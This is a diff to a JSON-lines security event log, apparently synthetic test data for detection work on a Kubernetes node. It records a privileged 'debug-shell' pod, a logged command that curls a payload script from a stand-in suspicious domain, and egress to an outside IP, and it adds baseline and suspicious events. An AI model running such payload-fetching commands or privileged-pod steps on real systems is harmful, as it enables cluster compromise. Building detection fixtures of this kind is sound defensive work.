@@ -2,3 +2,6 @@
 {"@timestamp":"2026-05-01T06:20:00Z","host.name":"k8s-node-01","user.name":"system:serviceaccount:default:builder","event.action":"create_pod","k8s.pod.name":"debug-shell","k8s.pod.privileged":true}
 {"@timestamp":"2026-05-01T06:23:00Z","host.name":"k8s-node-01","event.action":"container_exec","process.name":"sh","process.command_line":"curl hxxp://suspicious.example.com/payload.sh"}
 {"@timestamp":"2026-05-01T06:25:00Z","host.name":"k8s-node-01","destination.ip":"185.244.25.12","event.action":"egress_connection"}
+{"@timestamp":"2026-05-01T14:00:00Z","host.name":"baseline-host-01","user.name":"ops.user","source.ip":"10.10.10.10","destination.ip":"10.10.10.20","domain":"internal.local","event.action":"normal_operation"}
+{"@timestamp":"2026-05-01T14:03:00Z","host.name":"baseline-host-01","user.name":"ops.user","source.ip":"10.10.10.10","destination.ip":"10.10.10.21","event.action":"normal_read"}
+{"@timestamp":"2026-05-01T14:07:00Z","host.name":"susp-host-09","user.name":"unknown.user","source.ip":"10.10.10.50","destination.ip":"185.244.25.12","domain":"suspicious.example.com","event.action":"suspicious_action"}
